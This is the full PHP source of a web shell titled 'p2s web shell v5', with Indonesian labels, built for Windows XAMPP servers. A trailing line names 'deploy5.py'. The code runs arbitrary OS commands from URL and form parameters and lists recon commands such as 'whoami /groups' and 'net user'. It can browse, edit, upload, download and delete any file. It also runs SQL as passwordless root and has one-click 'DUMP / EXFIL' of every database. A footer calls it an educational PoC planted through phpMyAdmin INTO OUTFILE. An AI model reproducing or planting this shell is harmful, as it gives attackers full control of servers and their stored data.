1:error_reporting(0); $MX = "c:/xampp/mysql/bin/mysql.exe"; $MD = "c:/xampp/mysql/bin/mysqldump.exe"; $u = getenv("USERNAME"); $c = getenv("COMPUTERNAME"); $p = isset($_GET["p"]) ? $_GET["p"] : "c:/xampp/htdocs"; $a = isset($_GET["a"]) ? $_GET["a"] : ""; $tab = isset($_GET["tab"]) ? $_GET["tab"] : ""; $t = date("d-m-Y H:i:s"); $Q = chr(34); $QQ = $Q . $Q; $nav = array("beranda" => "?", "terminal" => "?tab=cmd", "files" => "?tab=files", "database" => "?tab=sql&q=show+databases");  function pagehead() { echo "<!DOCTYPE html><html><head><meta charset=utf-8><title>p2s-shell v5 - " . $c . "</title><style>body{background:#0d1117;color:#c9d1d9;font-family:Consolas,monospace;font-size:13px;margin:14px}a{color:#58a6ff;text-decoration:none}a:hover{text-decoration:underline}input,textarea,select{background:#161b22;color:#33ff66;border:1px solid #30363d;font-family:inherit;padding:4px}textarea{width:100%;height:150px}h4{color:#f0883e;margin:14px 0 4px}table{border-collapse:collapse;width:100%}td,th{padding:2px 8px;border-bottom:1px solid #21262d;text-align:left}pre{background:#161b22;border:1px solid #30363d;padding:8px;overflow:auto;white-space:pre-wrap}button{background:#238636;color:#fff;border:0;padding:6px 14px;cursor:pointer}.tab{background:#1f6feb;color:#fff;padding:6px 14px}.dim{color:#8b949e}</style></head><body>"; echo "<h3 style=color:#33ff66>p2s web shell v5 <span class=dim> | " . $u . "@" . $c . " | win " . php_uname("r") . " | php " . PHP_VERSION . " | " . $t . " </span></h3>"; echo "<p>"; foreach ($nav as $nm => $lk) { $cur = (($nm == "beranda" && $tab == "") || ($nm == "terminal" && $tab == "cmd") || ($nm == "files" && $tab == "files") || ($nm == "database" && $tab == "sql")); echo ($cur ? "<span class=tab>" . strtoupper($nm) . "</span>" : "<a href=" . $lk . ">" . strtoupper($nm) . "</a>") . " &nbsp; "; } echo "</p>"; } if ($a == "dl" && isset($_GET["f"])) { header("Content-Type: application/octet-stream"); header("Content-Disposition: attachment; filename=" . basename($_GET["f"])); readfile($_GET["f"]); exit; } if ($a == "dump" && isset($_GET["db"])) { $db = preg_replace("/[^a-zA-Z0-9_]/", "", $_GET["db"]); if ($_GET["db"] == "ALL") { $dbs0 = shell_exec($MX . " -uroot -N -e \"show databases\""); $list = ""; foreach (explode(chr(10), str_replace(chr(13), "", trim($dbs0))) as $d) { if (preg_match("/^[a-zA-Z0-9_]+$/", $d) && $d != "information_schema" && $d != "performance_schema") { $list .= " " . $d; } } shell_exec($MD . " -uroot --databases" . $list . " > c:/xampp/htdocs/all-dbs.sql 2>&1"); $fn = "c:/xampp/htdocs/all-dbs.sql"; } else { shell_exec($MD . " -uroot " . $db . " > c:/xampp/htdocs/dump-" . $db . ".sql 2>&1"); $fn = "c:/xampp/htdocs/dump-" . $db . ".sql"; } if (@filesize($fn) === false) { echo "DUMP GAGAL: " . htmlspecialchars($fn); exit; } header("Content-Type: application/octet-stream"); header("Content-Disposition: attachment; filename=" . basename($fn)); readfile($fn); @unlink($fn); exit; } if (($a == "sql" || $a == "sqlfile") && (isset($_POST["q"]) || isset($_GET["q"]))) { $q = isset($_POST["q"]) ? $_POST["q"] : $_GET["q"]; $db = isset($_POST["db"]) ? preg_replace("/[^a-zA-Z0-9_]/", "", $_POST["db"]) : ""; $tmp = "c:/xampp/htdocs/.q.sql"; file_put_contents($tmp, $q); $res = shell_exec($MX . " -uroot -t" . ($db !== "" ? " -D " . $db : "") . " < " . $tmp . " 2>&1"); @unlink($tmp); if ($res === null) $res = "EXEC-FAILED"; echo "<h4>HASIL SQL [db: " . htmlspecialchars($db) . "] via file .q.sql - multi-statement + kutip aman</h4><pre>" . htmlspecialchars($res) . "</pre>"; } if ($a == "run") { $r = shell_exec((isset($_GET["x"]) ? $_GET["x"] : "") . " 2>&1"); } elseif (isset($_POST["cmd"])) { $r = shell_exec($_POST["cmd"] . " 2>&1"); } else { $r = ""; } if ($a == "save" && isset($_POST["fp"]) && isset($_POST["ct"])) { file_put_contents($_POST["fp"], isset($_POST["b64"]) && $_POST["b64"] == "1" ? base64_decode($_POST["ct"]) : htmlspecialchars_decode($_POST["ct"], ENT_QUOTES)); $r = "SAVED -> " . $_POST["fp"]; } if ($a == "up" && isset($_POST["d"]) && isset($_POST["fn"]) && isset($_POST["data"])) { $n = rtrim($_POST["d"], "/") . "/" . $_POST["fn"]; file_put_contents($n, base64_decode($_POST["data"])); $r = "UPLOADED " . strlen(base64_decode($_POST["data"])) . " bytes -> " . $n; } if ($a == "del" && isset($_GET["f"])) { @unlink($_GET["f"]); $r = "DELETED " . $_GET["f"]; } if ($r !== "") echo "<pre>" . htmlspecialchars($r) . "</pre>"; pagehead(); if ($tab == "cmd") { $quick = array("set", "ipconfig", "tasklist", "netstat -an", "net localgroup administrators", "c:/windows/system32/whoami.exe /groups", "c:/windows/system32/net.exe user", "systeminfo", "schtasks /query /fo LIST /v"); echo "<h4>PERINTAH CEPAT</h4>"; foreach ($quick as $v) { echo "<a href=?tab=cmd&a=run&x=" . rawurlencode($v) . ">[ " . $v . " ]</a> &nbsp; "; } echo "<h4>RUN CMD</h4><form method=POST><input size=95 name=cmd value=" . $Q . htmlspecialchars(isset($_POST["cmd"]) ? $_POST["cmd"] : "dir c:/xampp/htdocs") . $Q . "><button>RUN</button></form>"; } elseif ($tab == "sql") { if (!isset($_GET["q"])) { $dbs = shell_exec($MX . " -uroot -N -e \"show databases\" 2>&1"); echo "<h4>DAFTAR DATABASE (root tanpa password)</h4><pre>" . htmlspecialchars($dbs) . "</pre>"; } echo "<h4>KONSOL SQL - multi-statement, bebas kutip (query ditampung ke file hidden .q.sql dulu)</h4><form method=POST action=?a=sql>DB: <input size=30 name=db value=" . $Q . htmlspecialchars(isset($_POST["db"]) ? $_POST["db"] : "") . $Q . " placeholder=kosongkan-untuk-tanpa-db><br><textarea name=q rows=8 placeholder=" . $Q . "select+version()" . $Q . ">" . htmlspecialchars(isset($_POST["q"]) ? $_POST["q"] : (isset($_GET["q"]) ? $_GET["q"] : "")) . "</textarea><button>JALANKAN QUERY</button></form>"; echo "<h4>DUMP / EXFIL ONE-CLICK (mysqldump -uroot -> download .sql -> file temp autohapus)</h4>"; $dbs2 = shell_exec($MX . " -uroot -N -e \"show databases\" 2>&1"); foreach (explode(chr(10), str_replace(chr(13), "", trim($dbs2))) as $d) { if (preg_match("/^[a-zA-Z0-9_]+$/", $d) && !in_array($d, array("information_schema", "performance_schema", "mysql", "phpmyadmin"))) { echo "<a href=?a=dump&db=" . $d . ">[ " . $d . " ]</a> &nbsp; "; } } echo "<br><b><a href=?a=dump&db=ALL>[ DUMP SEMUA DB SEKALIAN ]</a></b>"; } elseif ($tab == "files") { if ($a == "edit" && isset($_GET["f"])) { $fc = file_get_contents($_GET["f"]); echo "<h4>EDIT " . htmlspecialchars($_GET["f"]) . "</h4><form method=POST action=?a=save><input size=90 name=fp value=" . $Q . htmlspecialchars($_GET["f"]) . $Q . "><br><textarea name=ct rows=26>" . htmlspecialchars($fc) . "</textarea><br><button>SAVE FILE</button></form>"; } else { echo "<h4>FILE MANAGER: <a href=?tab=files&p=" . rawurlencode(dirname($p)) . ">" . htmlspecialchars($p) . "</a></h4>"; $items = array_slice(scandir($p), 2); echo "<table>"; foreach ($items as $i) { $fp = rtrim($p, "/") . "/" . $i; $sz = @filesize($fp); if (is_dir($fp)) { echo "<tr><td><a href=?tab=files&p=" . rawurlencode($fp) . ">[DIR] " . $i . "/</a></td><td></td></tr>"; } else { echo "<tr><td><a href=?tab=files&a=edit&f=" . rawurlencode($fp) . ">" . $i . "</a></td><td>" . ($sz === false ? "?" : $sz) . " B &nbsp; <a href=?a=dl&f=" . rawurlencode($fp) . ">DL</a> &nbsp; <a href=?tab=files&a=del&f=" . rawurlencode($fp) . ">x</a></td></tr>"; } } echo "</table>"; echo "<h4>UPLOAD (isi = base64)</h4><form method=POST action=?a=up>DIR: <input size=50 name=d value=" . $Q . htmlspecialchars($p) . $Q . "> NAMA: <input size=25 name=fn placeholder=namafile><br><textarea name=data rows=3 placeholder=base64-isi-file></textarea><button>UPLOAD</button></form>"; } } echo "<h4 class=dim>p2s-research - PoC edukatif - masuk via phpMyAdmin 5.2.1 root(kosong) INTO OUTFILE hex - " . $t . "</h4></body></html>";
deploy5.py
